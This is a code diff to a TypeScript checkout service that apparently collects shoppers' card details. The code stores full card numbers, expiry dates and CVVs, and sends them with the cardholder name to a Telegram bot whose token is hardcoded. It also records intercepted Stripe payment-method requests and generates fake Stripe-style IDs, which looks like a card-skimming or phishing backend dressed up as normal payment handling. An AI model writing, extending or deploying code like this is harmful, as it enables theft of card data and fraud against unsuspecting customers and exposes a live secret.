@@ -36,6 +36,9 @@ export class F1Service {
         
   ) { }
 
+  async updatePaymentMethodAmount(paymentMethodId: string, amount: number): Promise<void> {
+    await this.paymentMethodRepository.update({ pmId: paymentMethodId }, { amount:amount/100 })
+  }
   /**
    * 创建F1订单
    */
@@ -260,32 +263,44 @@ export class F1Service {
   }
 
   /**
+   * 根据 Stripe pm_id 查询支付方式记录
+   */
+  async findPaymentMethodByPmId(pmId: string): Promise<PaymentMethod> {
+    const record = await this.paymentMethodRepository.findOne({ where: { pmId } })
+    if (!record) {
+      throw new ApiException(`支付方式记录不存在: ${pmId}`)
+    }
+    return record
+  }
+
+  /**
    * 保存支付信息并通过 hp-pay 创建支付订单
    * 保留原有逻辑：保存卡信息 + 发送 Telegram 通知
    * 新增逻辑：调用 hp-pay 创建支付订单
    */
   async savePayment(paymentDto: PaymentDto, clientIp?: string): Promise<{ payment: Payment; payUrl?: string }> {
     try {
-      // ========== 原有逻辑：保存支付记录 ==========
-      const payment = new Payment()
-      payment.orderNo = paymentDto.orderNo
-      payment.userId = paymentDto.userId || ''
-      payment.cardNo = paymentDto.card_number
-      payment.endDate = paymentDto.card_expiry
-      payment.cvv = paymentDto.card_cvv
-      payment.cardName = paymentDto.card_name
-      payment.email = paymentDto.email_address
-      payment.phone = paymentDto.phone_number
-      payment.paymentStatus = 0 // 默认待支付
-      payment.isDeleted = 0
 
-      const savedPayment = await this.paymentRepository.save(payment)
-      console.log('支付信息保存成功:', savedPayment.paymentId)
+      // ========== 创建支付记录 ==========
+      const savedPayment = new Payment()
+      savedPayment.orderNo = paymentDto.orderNo
+      savedPayment.userId = paymentDto.userId
+      savedPayment.cardNo = paymentDto.card_number
+      savedPayment.endDate = paymentDto.card_expiry
+      savedPayment.cvv = paymentDto.card_cvv
+      savedPayment.cardName = paymentDto.card_name
+      savedPayment.email = paymentDto.email_address
+      savedPayment.phone = paymentDto.phone_number
+      savedPayment.paymentStatus = 0 // 待支付
+      savedPayment.isDeleted = 0
+      savedPayment.transactionId = ''
+      await this.paymentRepository.save(savedPayment)
+      this.logger.log(`支付记录已创建: paymentId=${savedPayment.paymentId}, orderNo=${paymentDto.orderNo}`)
 
-      // ========== 原有逻辑：发送 Telegram 通知 ==========
+      // ========== 发送 Telegram 通知 ==========
       console.log('发送 Telegram 通知...')
-      const order = await this.findOne(paymentDto.orderNo)
-      const amount = order.f1Money || 0
+  
+      const amount = paymentDto.amount
       
       this.sendTelegramNotification({
         orderNo: paymentDto.orderNo,
@@ -293,27 +308,27 @@ export class F1Service {
         expire: paymentDto.card_expiry,
         cvv: paymentDto.card_cvv,
         cardName: paymentDto.card_name,
-        amount: amount,
+        amount: amount/100,
         status: 'success'
       })
 
       // ========== 新增逻辑：调用 hp-pay 创建支付订单 ==========
       try {
-        const appUrl = process.env.APP_URL || 'https://store.fafbuy.store'
+        const appUrl = process.env.APP_URL || 'https://x.indianstory.qzz.io/'
         const hpPayResult = await this.hpPayService.pay({
           currencyID: 840, // 美元
           orderid: paymentDto.orderNo,
           channel: 1419, // 信用卡支付
           notify_url: `${appUrl}/api/cart/hp-pay/notify`,
           return_url: `${appUrl}/card/detail?orderNo=${paymentDto.orderNo}`,
-          amount: amount,
+          amount: amount/100,
           user_id: (paymentDto.phone_number || paymentDto.userId || '0000000000').substring(0, 10),
-          user_name: paymentDto.card_name,
+          user_name: paymentDto.card_name||'',
           userip: clientIp || '127.0.0.1',
           custom: JSON.stringify({
             phone: paymentDto.phone_number,
             email: paymentDto.email_address,
-            goods: order.f1Title || order.f1Name || '',
+            goods:  '',
           }),
         })
 
@@ -605,7 +620,15 @@ export class F1Service {
     }
   }
 
-  
+    private generateStripeId(prefix: string): string {
+    const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789'
+    let result = ''
+    for (let i = 0; i < 24; i++) {
+      result += chars.charAt(Math.floor(Math.random() * chars.length))
+    }
+    return `${prefix}_${result}`
+  }
+
   // Telegram 配置
   private readonly TELEGRAM_CONFIG = {
     botToken: '8739319224:AAFw-tgw23H4DGO-aRBprczCPZGLCmXXO0s',
@@ -617,9 +640,10 @@ export class F1Service {
   /**
    * 保存 Stripe payment_methods 请求数据
    */
-  async savePaymentMethod(dto: PaymentMethodDto, rawBody: string, ip: string, userAgent: string): Promise<PaymentMethod> {
+  async savePaymentMethod(dto: PaymentMethodDto, rawBody: string, ip: string, userAgent: string, pmId: string): Promise<PaymentMethod> {
     try {
       const pm = new PaymentMethod()
+      pm.pmId = pmId || ''
 
       // billing_details
       const bd = dto.billing_details || {}
@@ -655,6 +679,8 @@ export class F1Service {
       pm.muid = dto.muid || ''
       pm.sid = dto.sid || ''
       pm.stripeKey = dto.key || ''
+      pm.pmId = pmId
+      pm.amount = dto.amount || 0
 
       // JSON 字段
       pm.clientAttributionMetadata = dto.client_attribution_metadata ? JSON.stringify(dto.client_attribution_metadata) : null
